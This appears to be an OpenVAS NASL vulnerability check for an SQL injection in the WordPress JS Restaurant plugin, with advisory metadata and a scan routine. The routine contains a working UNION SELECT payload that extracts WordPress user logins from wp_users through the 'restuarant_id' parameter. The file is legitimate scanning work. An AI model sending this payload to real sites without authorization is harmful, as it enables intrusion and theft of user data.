###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_js_restaurant_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# WordPress JS Restaurant Plugin SQL Injection Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to manipulate SQL queries by
  injecting arbitrary SQL code and gain sensitive information.
  Impact Level: Application";

tag_affected = "WordPress JS Restaurant Plugin";
tag_insight = "Input passed to 'wp-content/plugins/js-restaurant/popup.php' script via
  'restuarant_id' parameter is not properly sanitised before being used in
  a SQL query.";
tag_solution = "No solution or patch is available as of 16th July, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://codecanyon.net/item/js-restaurant-table-reservation-plugin/721145";
tag_summary = "This host is running WordPress JS Restaurant plugin and is prone to sql
  injection vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803697";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-07-16 13:11:56 +0530 (Tue, 16 Jul 2013)");
  script_name("WordPress JS Restaurant Plugin SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122316/wpjsrestaurant-sql.txt");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/wordpress-js-restaurant-sql-injection");
  script_summary("Check if WordPress JS Restaurant Plugin is vulnerable to SQL injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
url = "";
dir = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)) exit(0);

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)) exit(0);

## Construct SQL attack request
url = dir + '/wp-content/plugins/js-restaurant/popup.php?restuarant_id='+
     '-2%20UNION%20SELECT%201,group_concat(user_login,'+
     '0x4f70656e5641532053514c54657374),3,4,5,6,7,8,9,10,11,12,13,14,15,16,'+
     '17,18,19,20,21,22,23,24,25,26,27%20from%20wp_users--+';

## Confirm exploit worked properly or not
if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"OpenVAS SQLTest",
                   extra_check:make_list("date_restaurant","selectday_res")))
{
  security_hole(port);
  exit(0);
}
